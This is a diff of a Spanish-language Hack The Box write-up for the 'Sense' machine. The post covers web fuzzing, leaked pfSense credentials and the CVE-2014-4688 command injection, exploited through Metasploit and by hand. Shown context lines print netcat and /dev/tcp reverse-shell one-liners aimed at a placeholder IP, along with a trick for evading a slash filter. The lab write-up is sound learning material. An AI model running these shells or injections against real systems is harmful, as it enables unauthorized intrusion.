@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Sense - Hack The Box
-excerpt: "Esta fue una máquina que jugó un poco con mi paciencia porque utilicé Fuzzing para listar archivos en la página web para encontrar algo útil, que, si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al servicio pfSense y se utilizó un Exploit, el CVE-2014-4688, para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios."
+excerpt: "Esta fue una máquina que jugó un poco con mi paciencia porque utilicé Fuzzing para listar archivos en la página web para encontrar algo útil, que si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que distraerme un poco en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al servicio pfSense y se utilizó un Exploit CVE-2014-4688 para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios."
 date: 2023-03-08
 classes: wide
 header:
@@ -17,23 +17,26 @@ tags:
   - Fuzzing
   - Information Leakage
   - Command Injection (CI)
-  - CVE-2014-4688
+  - CVE-2014-4688 (CI)
   - BurpSuite
   - OSCP Style
   - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-sense/sense_logo.png)
 
-Esta fue una máquina que jugó un poco con mi paciencia, porque utilicé **Fuzzing** para listar archivos en la página web para encontrar algo útil, que, si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al **servicio pfSense** y se utilizó un Exploit, el **CVE-2014-4688**, para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios.
+Esta fue una máquina que jugó un poco con mi paciencia, porque utilicé **Fuzzing** para listar archivos en la página web para encontrar algo útil, que si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que distraerme un poco en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al **servicio pfSense** y se utilizó un Exploit **CVE-2014-4688** para poder conectarnos de manera remota, siendo que nos conecta como **Root**, no fue necesario hacer una escalada de privilegios.
 
 Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *wappalizer*
 * *wfuzz*
 * *gobuster*
 * *burpsuite*
 * *nc*
-* *metasploit framework*
+* *metasploit framework(msfconsole)*
+* *meterpreter*
+* *Módulo: exploit/unix/http/pfsense_graph_injection_exec*
 
 
 <br>
@@ -71,10 +74,7 @@ Herramientas utilizadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -173,10 +173,7 @@ Supongo que al entrar en la página web nos redirigirá al puerto 443, igualment
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -236,20 +233,7 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                     
 =====================================================================
 
-000000007:   200        173 L    425 W      6690 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
-000000003:   200        173 L    425 W      6690 Ch     "# Copyright 2007 James Fisher"                                             
-000000001:   200        173 L    425 W      6690 Ch     "# directory-list-2.3-medium.txt"                                           
 000000014:   200        173 L    425 W      6690 Ch     "https://10.10.10.60//"                                                     
-000000013:   200        173 L    425 W      6690 Ch     "#"                                                                         
-000000012:   200        173 L    425 W      6690 Ch     "# on atleast 2 different hosts"                                            
-000000011:   200        173 L    425 W      6690 Ch     "# Priority ordered case sensative list, where entries were found"          
-000000010:   200        173 L    425 W      6690 Ch     "#"                                                                         
-000000009:   200        173 L    425 W      6690 Ch     "# Suite 300, San Francisco, California, 94105, USA."                       
-000000006:   200        173 L    425 W      6690 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"             
-000000008:   200        173 L    425 W      6690 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                
-000000005:   200        173 L    425 W      6690 Ch     "# This work is licensed under the Creative Commons"                        
-000000002:   200        173 L    425 W      6690 Ch     "#"                                                                         
-000000004:   200        173 L    425 W      6690 Ch     "#"                                                                         
 000003597:   200        228 L    851 W      7492 Ch     "tree"                                                                      
 000008057:   200        173 L    404 W      6113 Ch     "installer"                                                                 
 000045240:   200        173 L    425 W      6690 Ch     "https://10.10.10.60//"                                                     
@@ -342,19 +326,6 @@ Total requests: 220560
 ID           Response   Lines    Word       Chars       Payload                                                                     
 =====================================================================
 
-000000001:   200        173 L    425 W      6690 Ch     "# directory-list-2.3-medium.txt"                                           
-000000003:   200        173 L    425 W      6690 Ch     "# Copyright 2007 James Fisher"                                             
-000000007:   200        173 L    425 W      6690 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"           
-000000012:   200        173 L    425 W      6690 Ch     "# on atleast 2 different hosts"                                            
-000000011:   200        173 L    425 W      6690 Ch     "# Priority ordered case sensative list, where entries were found"          
-000000013:   200        173 L    425 W      6690 Ch     "#"                                                                         
-000000010:   200        173 L    425 W      6690 Ch     "#"                                                                         
-000000009:   200        173 L    425 W      6690 Ch     "# Suite 300, San Francisco, California, 94105, USA."                       
-000000006:   200        173 L    425 W      6690 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"             
-000000008:   200        173 L    425 W      6690 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                
-000000005:   200        173 L    425 W      6690 Ch     "# This work is licensed under the Creative Commons"                        
-000000002:   200        173 L    425 W      6690 Ch     "#"                                                                         
-000000004:   200        173 L    425 W      6690 Ch     "#"                                                                         
 000001268:   200        9 L      40 W       271 Ch      "changelog"                                                                 
 000120222:   200        6 L      12 W       106 Ch      "system-users"                                                              
 
@@ -469,17 +440,14 @@ Ahí está la versión del **pfSense**, ahora podemos buscar un Exploit para est
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
 
 <h2 id="PruebaExp">Buscando un Exploit para pfSense</h2>
 
-Como ya encontramos la versión de pfSense que está ocupando la máquina víctima, vamos a buscar un Exploit adecuado que nos ayude a acceder a la máquina:
+Como ya encontramos la versión de **pfSense** que está ocupando la máquina víctima, vamos a buscar un Exploit adecuado que nos ayude a acceder a la máquina:
 
 ```bash
 searchsploit pfsense 2.1.3                                                                               
@@ -630,8 +598,7 @@ Listo, ganamos acceso con **Metasploit**.
 <h2 id="PruebaExp4">Inyectando Comandos en status_rrd_graph_img.php de pfSense</h2>
 
 Existe un blog que explica como inyectar comandos en un **archivo PHP** de **pfSense**, te lo comparto:
-
-* https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/
+* <a href="https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/" target="_blank">PfSense Vulnerabilities Part 2: Command Injection</a>
 
 De acuerdo al blog, nosotros podemos usar el **archivo status_rrd_graph_img.php** para inyectar comandos, dentro de ese script, la variable **exec()** es la que presenta la vulnerabilidad, entonces, según el blog podemos usar el **parámetro queues** para inyectar nuestro comando, dentro del **parámetro GET database**. 
 
@@ -663,7 +630,11 @@ Vamos a tratar de inyectar un comando de prueba, siguiendo los pasos que mencion
 
 De esta forma comprobamos que, podemos inyectar comandos, vamos a intentar conectarnos a la máquina inyectando una **Reverse Shell**.
 
+-------
+
 **IMPORTANTE**: Por lo que entiendo del blog, es necesario que la inyección sea usando bash, es decir, que no podemos incluir un **archivo PHP** con una **cmd** como lo hemos hecho antes. E incluso, parece que estamos limitados en cuanto a caracteres se refiere, pues uno de los caracteres que impedira la ejecución de nuestros comandos, será el **slash (/)**, por lo que debemos buscar una alternativa y ver si hay otros caracteres que impediran la ejecución de nuestros comandos.
+
+------
 
 Para lograr esto, podemos utilizar **netcat** con el fin de ver que caracteres y comandos funcionan, ya que ni el código fuente ni el render, nos muestran si fue correcta nuestra inyección.
 
@@ -711,7 +682,8 @@ LANG=en_US.ISO8859-1
 PHP_FCGI_CHILDREN=1
 PWD=/var/db/rrd
 ```
-Entonces, si usamos HOME dentro de nuestra inyección, será igual al **slash(/)**, probemoslo:
+
+Entonces, si usamos **HOME** dentro de nuestra inyección, será igual al **slash(/)**, probemoslo:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-sense/Captura16.png">
@@ -752,6 +724,7 @@ En mi caso, probe las siguientes:
 
 -> exec 5<>/dev/tcp/Tu_IP/443;cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
+
 Y ninguna funciono a excepción de esta:
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc Tu_IP 443 >/tmp/f
@@ -788,10 +761,7 @@ Y listo, hemos vuelto a ganar acceso y completado la máquina.
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
@@ -806,6 +776,51 @@ Y listo, hemos vuelto a ganar acceso y completado la máquina.
 * https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 * https://www.youtube.com/watch?v=mWTmXpQlgCs
 
+
 <br>
 # FIN
 
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
